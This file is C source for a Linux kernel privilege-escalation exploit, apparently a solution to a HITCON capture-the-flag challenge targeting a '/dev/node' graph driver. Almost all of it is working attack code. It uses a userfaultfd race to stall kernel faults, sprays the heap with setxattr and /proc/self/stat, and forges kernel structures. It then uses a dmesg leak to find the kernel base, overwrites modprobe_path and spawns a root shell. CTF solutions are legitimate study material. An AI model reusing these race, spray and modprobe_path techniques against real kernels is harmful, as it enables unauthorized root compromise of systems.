#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <malloc.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <sys/xattr.h>
#include <poll.h>


void *stall_thread(void *arg)
{
    struct uffd_msg uf_msg;
    long uffd = (long)arg;
    struct pollfd pollfd;
    int nready;

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    while(poll(&pollfd, 1, -1) > 0)
    {
        if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
        {
            perror("polling error");
            exit(-1);
        }
        // reading the event
        if(read(uffd, &uf_msg, sizeof(uf_msg)) == 0)
        {
            perror("error reading event");
            exit(-1);
        }
        if(uf_msg.event != UFFD_EVENT_PAGEFAULT)
        {
            perror("unexpected result from event");
            exit(-1);
        }
        printf("caught a race @ %p\n", uf_msg.arg.pagefault.address);
     }
    return 0;
}


void register_userfaultfd_stall(void *addr, uint64_t size)
{
    int uffd, race;
    struct uffdio_api uf_api;
    struct uffdio_register uf_register;
    pthread_t thread;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    uf_api.api = UFFD_API;
    uf_api.features = 0;

    // creating userfaultfd for race condition because using unlocked_ioctl without locking mutexes
    if (ioctl(uffd, UFFDIO_API, &uf_api) == -1)
    {
        perror("error with the uffdio_api");
        exit(-1);
    }

    uf_register.range.start = addr;
    uf_register.range.len = size;
    uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;

    // uffd will change when the kernel thread page faults here and hangs
    if (ioctl(uffd, UFFDIO_REGISTER, &uf_register) == -1)
    {
        perror("error registering page for userfaultfd");
    }

    race = pthread_create(&thread, NULL, stall_thread, (void*)uffd);
    if(race != 0)
    {
        perror("can't setup threads for race");
    }
    return;
}



char got_leak = 0;
uint64_t leak_val = 0;
void* fake_other_struct;


void *fulfill_thread(void *arg)
{
    struct uffd_msg uf_msg;
    long uffd = (long)arg;
    struct pollfd pollfd;
    int nready;

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    while(poll(&pollfd, 1, -1) > 0)
    {
        if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
        {
            perror("polling error");
            exit(-1);
        }
        // reading the event
        if(read(uffd, &uf_msg, sizeof(uf_msg)) == 0)
        {
            perror("error reading event");
            exit(-1);
        }
        if(uf_msg.event != UFFD_EVENT_PAGEFAULT)
        {
            perror("unexpected result from event");
            exit(-1);
        }
        uint64_t addr = uf_msg.arg.pagefault.address;
        printf("caught a fulfill race @ %p\n", addr);

        char buf[0x1000];
        memset(buf, 0, sizeof(buf));
        while (!got_leak) {
          sleep(1);
        }

        uint64_t* buf_ptr = buf;
        buf_ptr[0] = leak_val;
        buf_ptr[1] = 0;
        buf_ptr[2] = fake_other_struct;
        buf_ptr[3] = 0x69696969;

        struct uffdio_copy cp;
        cp.src = (uint64_t)buf;
        cp.dst = (addr & ~(0x1000 - 1));
        cp.len = 0x1000;
        cp.mode = 0;

        if(ioctl(uffd, UFFDIO_COPY, &cp) == -1)
        {
          perror("uffdio_copy error");
          exit(-1);
        }
        puts("Fulfill finished");
     }
    return 0;
}


void register_userfaultfd_fulfill(void *addr)
{
    int uffd, race;
    struct uffdio_api uf_api;
    struct uffdio_register uf_register;
    pthread_t thread;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    uf_api.api = UFFD_API;
    uf_api.features = 0;

    // creating userfaultfd for race condition because using unlocked_ioctl without locking mutexes
    if (ioctl(uffd, UFFDIO_API, &uf_api) == -1)
    {
        perror("error with the uffdio_api");
        exit(-1);
    }

    uf_register.range.start = addr;
    uf_register.range.len = 0x1000;
    uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;

    // uffd will change when the kernel thread page faults here and hangs
    if (ioctl(uffd, UFFDIO_REGISTER, &uf_register) == -1)
    {
        perror("error registering page for userfaultfd");
    }

    race = pthread_create(&thread, NULL, fulfill_thread, (void*)uffd);
    if(race != 0)
    {
        perror("can't setup threads for race");
    }
    return;
}





#define DEV_PATH "/dev/node"
#define SPARK_LINK 0x4008D900
#define SPARK_QUERY 0xC010D903
#define SPARK_FINALIZE 0xD902
#define SPARK_GET_INFO 0x8018D901

struct spark_ioctl_query {
  int fd1;
  int fd2;
  unsigned long long distance;
};

static void link(int a, int b, unsigned int weight) {
  assert(ioctl(a, SPARK_LINK, b | ((unsigned long long) weight << 32)) == 0);
}

static void query(int base, int a, int b) {
  struct spark_ioctl_query qry = {
    .fd1 = a,
    .fd2 = b,
  };
  assert(ioctl(base, SPARK_QUERY, &qry) == 0);
}

struct mutex {
  uint64_t owner;
  uint64_t wait_lock;
  void* prev;
  void* next;
};

struct link {
  void *prev;
  void *next;
  void* other;
  uint64_t weight;
};

struct spark_node {
  uint64_t node_num;
  uint64_t refcount;
  struct mutex state_lock;
  uint64_t finalized;
  struct mutex nb_lock;
  uint64_t links_cnt;
  void* prev;
  void* next;
  uint64_t local_idx;
  void* neighbours;
};

struct neighbour_list {
  uint64_t size;
  uint64_t cap;
  void *arr;
};

struct elements {
    void *page;
    int size;
};

static void *spray_thread(void *arg) {
  struct elements *_elements;

  _elements = (struct elements *)arg;

  setxattr("./", "v4bel", _elements->page, _elements->size, XATTR_CREATE);
}

void do_async(void *function, void *arg) {
  pthread_t fuck;
  pthread_create(&fuck, NULL, function, arg);
}

void finalize(void *arg) {
  ioctl((unsigned int)arg, SPARK_FINALIZE);
}

#define NUM_SPRAY 128
#define SPRAY_CNT 512

char *modprobe_path;

void get_root() {
  modprobe_path[0] = '/';
  modprobe_path[1] = 't';
  modprobe_path[2] = 'm';
  modprobe_path[3] = 'p';
  modprobe_path[4] = '/';
  modprobe_path[5] = 's';
  modprobe_path[6] = 'i';
  modprobe_path[7] = 'c';
  modprobe_path[8] = 'e';
  modprobe_path[9] = 0;
}

void get_shell() {
  system("/bin/sh");
}


int main(int argc, char *argv[]) {
  void * leak_addr = 0x700000000000ULL;
  if (mmap(leak_addr, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) != leak_addr)
  {
    perror("whoopsie doopsie on mmap A");
    exit(-1);
  }

  void * spray_addr = 0x500000000000ULL;
  if (mmap(spray_addr, SPRAY_CNT * 0x1000 * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) != spray_addr)
  {
    perror("whoopsie doopsie on mmap spray");
    exit(-1);
  }

  uint64_t rop[4];
  for (int i = 0; i < 4; i++) {
    rop[i] = (void*)get_root;
  }
  printf("Target %p\n", rop[0]);
  for (int i=1; i<SPRAY_CNT*2; i+=2) {
    memcpy(spray_addr+(0x1000*i)-0x18, rop, 0x18);
  }

  void* fake_link_fault = 0x600000000000ULL;
  if (mmap(fake_link_fault, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) != fake_link_fault)
  {
    perror("whoopsie doopsie on mmap B");
    exit(-1);
  }

  struct spark_node fake;
  memset(&fake, 0, sizeof(fake));
  fake.node_num = 2;
  fake.refcount = 0;
  fake.state_lock.prev = &fake.state_lock;
  fake.state_lock.next = &fake.state_lock;
  fake.nb_lock.prev = &fake.nb_lock;
  fake.nb_lock.next = &fake.nb_lock;
  fake.links_cnt = 2;
  fake.prev = fake_link_fault;

  memset(leak_addr + 0x1000 - 0x78, 0x43, 0x100);
  memcpy(leak_addr + 0x1000 - 0x78, &fake, 0x80);
  register_userfaultfd_stall(leak_addr + 0x1000, 0x1000);
  register_userfaultfd_fulfill(fake_link_fault);
  register_userfaultfd_stall(fake_link_fault + 0x1000, 0x1000);
  register_userfaultfd_stall(spray_addr, SPRAY_CNT * 0x1000 * 2);

  struct spark_node fake2;
  memset(&fake2, 0, sizeof(fake2));
  fake2.node_num = 3;
  fake2.refcount = 1;
  fake2.state_lock.prev = &fake2.state_lock;
  fake2.state_lock.next = &fake2.state_lock;
  fake2.nb_lock.prev = &fake2.nb_lock;
  fake2.nb_lock.next = &fake2.nb_lock;
  fake2.links_cnt = 0;
  fake2.prev = &fake2.prev;

  int fd[2];
  for (int i = 0; i < 2; i++) {
    fd[i] = open(DEV_PATH, O_RDONLY);
    assert(fd[i] >= 0);
  }

  link(fd[0], fd[1], 0x41424344);

  struct elements _elements;
  _elements.page = leak_addr+0x1000-0x78;
  _elements.size = 0x80;
  pthread_t fuck;

  puts("Closing FD 1");
  close(fd[1]);
  sleep(1);

  pthread_create(&fuck, NULL, spray_thread, &_elements);
  puts("Spraying");

  sleep(1);

  do_async(finalize, (void*)fd[0]);
  sleep(1);
  puts("leak done");
  system("dmesg | tail -n 50");

  printf("RCX RBX R13: ");
  uint64_t rcx_leak, rbx_leak, r13_leak;
  scanf("%llx %llx %llx", &rcx_leak, &rbx_leak, &r13_leak);

  uint64_t kernel_base = rcx_leak - 0x16690a8;
  uint64_t kmalloc_32_leak = rbx_leak;
  uint64_t kmalloc_128_leak = r13_leak;
  printf("Kernel Base: %p\n", kernel_base);
  printf("Kmalloc 32: %p\n", kmalloc_32_leak);
  printf("Kmalloc 128: %p\n", kmalloc_128_leak);

  modprobe_path = (char*)(kernel_base + 0x1662ba0L);
  printf("Modprobe Path: %p\n", modprobe_path);

  leak_val = kmalloc_128_leak + 0x60;
  fake_other_struct = &fake2;
  got_leak = 1;

  puts("Waiting for Traversal to End");
  sleep(1);
  // getchar(); getchar();

  struct neighbour_list fake_list;
  memset(&fake_list, 0, sizeof(fake_list));
  // uint64_t target_chunk = (kmalloc_32_leak & 0xffffffffffffff00ULL) + 0x100;
  uint64_t target_chunk = kmalloc_32_leak + 0x20;
  fake_list.arr = target_chunk;

  fake2.refcount = 1;
  fake2.neighbours = &fake_list;

  struct link fake_link;
  memset(&fake_link, 0, sizeof(fake_link));
  fake_link.prev = leak_val;
  fake_link.other = fake_other_struct;
  fake_link.weight = 0x69696969;

  munmap(fake_link_fault, 0x1000);
  if (mmap(fake_link_fault, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) != fake_link_fault)
  {
    perror("whoopsie doopsie on mmap C");
    exit(-1);
  }
  memcpy(fake_link_fault, &fake_link, sizeof(fake_link));

  int spray_fds[NUM_SPRAY];
  for(int i = 0; i < NUM_SPRAY; i++) {
    spray_fds[i] = open("/proc/self/stat", O_RDONLY);
  }
  puts("FDs sprayed");

  fake2.prev = fake_link_fault + 0x1000;

  sleep(1);
  do_async(close, (void*)fd[0]);
  sleep(2);

  // SPRAY THE FUCK OUT OF THIS SHIT
  pthread_t spray_threads[SPRAY_CNT];
  for(int i=1, j=0; i<SPRAY_CNT*2; i+=2,j++) {
    usleep(2000);
    struct elements _elements2;
    _elements2.page = spray_addr+i*0x1000-0x18;
    _elements2.size = 0x20;

    int p = pthread_create(&spray_threads[j], NULL, spray_thread, &_elements2);
  }

  char tmp_buf[0x1000];
  for (int i = 0; i < NUM_SPRAY; i++) {
    read(spray_fds[i], tmp_buf, 100);
  }

  sleep(2);

  get_shell();

  sleep(1000);
}

// hitcon{easy_graph_theory_easy_kernel_exploitation}
